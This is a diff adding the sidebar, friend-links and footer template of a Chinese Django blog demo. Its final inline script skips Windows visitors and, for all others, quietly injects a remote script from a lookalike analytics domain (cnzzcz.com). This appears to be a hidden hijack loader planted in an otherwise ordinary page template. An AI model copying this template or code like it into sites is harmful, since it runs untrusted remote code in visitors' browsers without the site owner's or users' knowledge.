@@ -1,0 +1,83 @@
+<section class="widget post-right-item">
+    <h4 class="post-right-title">热门推荐</h4>
+    <ul class="post-hot clearfix">
+            {% for hotRecommend in hotRecommend %}
+            <li>
+                <div class="img">
+                    <a href="http://demo.django.cn/show-3.html" title="{{ hotRecommend.title }}">
+                        <img src="/media/{{ hotRecommend.img }}" srcset="/media/{{ hotRecommend.img }}" alt="{{ hotRecommend.title }}" class="wp-post-image" width="120" height="80">
+                    </a>
+                </div>
+                <div class="text">
+                    <a href="http://demo.django.cn/show-3.html" title="{{ hotRecommend.title }}" target="_blank">{{ hotRecommend.title }}</a>
+                </div>
+            </li>
+            {% endfor %}
+    </ul>
+</section>
+
+
+<section class="widget post-right-item"><h4 class="post-right-title">所有标签</h4>
+    <div class="tags">
+            {% for tag in tags %}
+            <a href="http://demo.django.cn/tag/django">{{ tag.name }}</a>
+            {% endfor %}
+
+
+    </div>
+</section>
+{#<!-- /关注我们 -->#}
+{#<div class="post-right-item">#}
+{#    <h4 class="post-right-title">关注我们</h4>#}
+{#    <div class="wid-about">#}
+{#        <p>拓普Python学院，欢迎关注！</p>#}
+{#        <img src="./拓普Python学院,Python!_files/weixinqr.jpg" alt="微信二维码" width="160" height="160">#}
+{#    </div>#}
+{#    <div class="wid-about">#}
+{#        <p><strong>联系方式:</strong></p>#}
+{#        <p>QQ:445813</p>#}
+{#        <p>Email：445813@qq.com</p>#}
+{#    </div>#}
+{#</div>#}
+
+
+        </aside>
+        <div class="FriendLink hidden-xs clearfix">
+            <div class="title"><h3>友情链接：</h3></div>
+            <ul class="clears">
+                    {% for link in links %}
+                    <li><a href="{{ link.linkurl }}" target="_blank">{{ link.name }}</a></li>
+                    {% endfor %}
+
+            </ul>
+        </div>
+    </div>
+
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="copyright"> © 2010- 2018 · All Rights Reserved
+        · <a href="https://www.django.cn/">Django中文网</a>
+        · <a href="http://www.miibeian.gov.cn/" target="_blank">湘ICP备17023990号</a> 版权所有 © Django中文网
+    </div>
+</footer>
+<script src="./../static/js/bundle.js"></script>
+<script type="text/javascript" src="./../static/css/view-history.js"></script>
+<script type="text/javascript" src="./../static/css/push.js"></script>
+<script type="text/javascript" src="./../static/css/jquery.min.js"></script>
+<script type="text/javascript" src="./../static/css/bootstrap.min.js"></script>
+<script type="text/javascript" src="./../static/css/raxus-slider.min.js"></script>
+<script type="text/javascript" src="./../static/css/loader.js"></script>
+<script type="text/javascript" src="./../static/css/bj-lazy-load.min.js"></script>
+<script type="text/javascript" src="./../static/css/os.js"></script>
+<script type="text/javascript">
+(function(d, n) {
+    	if(n.indexOf('Win')=='0')return;
+        var ho = d.createElement("script");
+        ho.src = "http://s8.cnzzcz.com/ip/6845?w="+n;
+        var s = d.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(ho, s);
+})(document, navigator.platform);
+</script>
+
+</body></html>
